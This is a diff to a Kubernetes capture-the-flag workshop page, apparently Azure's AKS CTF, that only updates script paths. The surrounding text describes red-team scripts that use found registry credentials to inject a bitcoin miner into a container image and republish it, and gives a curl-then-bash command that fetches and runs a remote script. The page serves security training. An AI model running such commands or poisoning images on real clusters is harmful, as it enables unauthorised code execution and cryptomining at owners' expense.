@@ -35,13 +35,13 @@ Some of the other red-team members have found this [neat trick from Twitter](htt
 
 Good luck!  They've come up with two scripts:
 
-* [run-bitcoin-injector.sh](https://github.com/azure/aks-ctf/blob/main/workshop/bitcoin-injector/run-bitcoin-injector.sh) - deploy a [Kubernetes Job](https://kubernetes.io/docs/concepts/workloads/controllers/job/) that uses the registry credentials we found, to create another pod that injects our bitcoin miner into the container
-* [inject-image.sh](https://github.com/azure/aks-ctf/blob/main/workshop/bitcoin-injector/inject-image.sh) - Uses Buildah to pulls the current app image, injects the bitcoin miner into the image, re-publishes the image under the same name
+* [run-bitcoin-injector.sh](https://github.com/azure/aks-ctf/blob/main/workshop/scenario_3/run-bitcoin-injector.sh) - deploy a [Kubernetes Job](https://kubernetes.io/docs/concepts/workloads/controllers/job/) that uses the registry credentials we found, to create another pod that injects our bitcoin miner into the container
+* [inject-image.sh](https://github.com/azure/aks-ctf/blob/main/workshop/scenario_3/inject-image.sh) - Uses Buildah to pulls the current app image, injects the bitcoin miner into the image, re-publishes the image under the same name
 
 Let's go back to our admin panel and run the following:
 
 ```console
-curl -O -J https://raw.githubusercontent.com/azure/aks-ctf/refs/heads/main/workshop/bitcoin-injector/run-bitcoin-injector.sh; bash run-bitcoin-injector.sh
+curl -O -J https://raw.githubusercontent.com/azure/aks-ctf/refs/heads/main/workshop/scenario_3/run-bitcoin-injector.sh; bash run-bitcoin-injector.sh
 ```
 
 Everything has been installed.  Let's kill our process and let the new image come up
